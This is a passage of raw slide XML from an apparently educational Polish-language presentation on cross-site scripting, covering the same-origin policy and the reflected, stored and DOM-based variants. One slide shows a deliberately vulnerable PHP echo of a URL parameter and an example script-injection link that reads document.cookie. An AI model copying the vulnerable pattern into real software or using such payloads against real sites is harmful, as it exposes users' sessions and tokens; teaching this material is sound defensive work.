                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>#1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1123950" y="2607171"/>
            <a:ext cx="2847264" cy="57388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CWE-79 na szczycie CWE Top 25</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1123950" y="3282652"/>
            <a:ext cx="2847264"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D55"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Lista najgroźniejszych słabości oprogramowania MITRE, edycja 2024.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4405809" y="1669355"/>
            <a:ext cx="3380383" cy="2667794"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3689"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E0DDD4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="pl-PL"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4713784" y="1977330"/>
            <a:ext cx="2847366"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C4561F"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>OWASP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4713784" y="2607171"/>
            <a:ext cx="284736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Stały element Top 10</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4713784" y="3008412"/>
            <a:ext cx="284736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D55"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Od lat w rankingu; obecnie w ramach kategorii Injection.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7995741" y="1669355"/>
            <a:ext cx="3380284" cy="2667794"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3689"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E0DDD4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="pl-PL"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8303716" y="1977330"/>
            <a:ext cx="2847264"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C4561F"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>25+</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8303716" y="2607171"/>
            <a:ext cx="2847264"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Lat historii</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8303716" y="3008412"/>
            <a:ext cx="2847264"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D55"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Nazwa pojawiła się pod koniec lat 90., a błąd wciąż trafia do nowego kodu.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="14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04 · Źródła: MITRE CWE Top 25 (2024), OWASP Top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Same-Origin Policy: dlaczego to działa</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="1615380"/>
            <a:ext cx="4918456" cy="90914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1B1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Przeglądarka izoluje strony według </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>origin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> = schemat + host + port. Skrypt z jednego origin nie może czytać danych innego.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="2702322"/>
            <a:ext cx="4918456" cy="90914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1B1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>XSS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>omija tę barierę</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>: wstrzyknięty skrypt jest częścią strony, więc działa w jej origin – z pełnym dostępem do DOM, ciasteczek, localStorage i API.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5994400" y="1615380"/>
            <a:ext cx="5384800" cy="2260203"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4495"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="15171C"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="pl-PL"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6299200" y="1920180"/>
            <a:ext cx="491845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E8B84"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>// origin: https://bank.example</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6299200" y="2270621"/>
            <a:ext cx="491845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document.cookie</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6299200" y="2621062"/>
            <a:ext cx="491845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localStorage.getItem('token')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6299200" y="2971502"/>
            <a:ext cx="491845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fetch('/api/transfer', {...})</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6299200" y="3321943"/>
            <a:ext cx="491845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8A4B"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>// wstrzyknięty skrypt może to wszystko</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="14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Trzy rodzaje XSS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="815975" y="1669355"/>
            <a:ext cx="3380284" cy="2454672"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4010"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E0DDD4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="pl-PL"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1123950" y="1977330"/>
            <a:ext cx="284726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1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Reflected</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1123950" y="2409130"/>
            <a:ext cx="2847264"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4561F"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Odbity</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1123950" y="2784971"/>
            <a:ext cx="2847264" cy="105648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4D55"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Payload w żądaniu (np. parametr URL) wraca od razu w odpowiedzi serwera. Wymaga, by ofiara kliknęła spreparowany link.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4405809" y="1669355"/>
            <a:ext cx="3380383" cy="2454672"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4010"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E0DDD4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="pl-PL"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4713784" y="1977330"/>
            <a:ext cx="284736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1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Stored</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4713784" y="2409130"/>
            <a:ext cx="284736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6DB3"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Trwały</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4713784" y="2784971"/>
            <a:ext cx="2847366" cy="105648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4D55"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Payload zapisany w bazie danych i serwowany każdemu, kto otworzy stronę. Najgroźniejszy – nie wymaga interakcji.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7995741" y="1669355"/>
            <a:ext cx="3380284" cy="2454672"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4010"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E0DDD4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="pl-PL"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8303716" y="1977330"/>
            <a:ext cx="284726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1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>DOM-based</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8303716" y="2409130"/>
            <a:ext cx="2847264"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1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Po stronie klienta</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8303716" y="2784971"/>
            <a:ext cx="2847264" cy="105648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4D55"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Błąd tkwi w JavaScripcie strony, który przenosi dane ze źródła (np. URL) do niebezpiecznego „sinka”. Serwer może nic nie widzieć.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="14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C4561F"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>REFLECTED XSS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="11378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Wyszukiwarka, która odbija zapytanie</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="1889621"/>
            <a:ext cx="10566400" cy="1731963"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5866"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="15171C"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="pl-PL"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1117600" y="2143621"/>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E8B84"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>// serwer (PHP) – podatny kod</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1117600" y="2468662"/>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echo "Wyniki dla: " . $_GET['q'];</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1117600" y="2793702"/>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E8B84"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>// link wysłany ofierze</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1117600" y="3118743"/>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8A4B"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>https://shop.example/search?q=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="3926384"/>
            <a:ext cx="2603119"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4561F"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>1.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> Atakujący tworzy złośliwy link</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3492500" y="3926384"/>
            <a:ext cx="2603119"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4561F"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>2.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> Ofiara klika (e-mail, czat, reklama)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
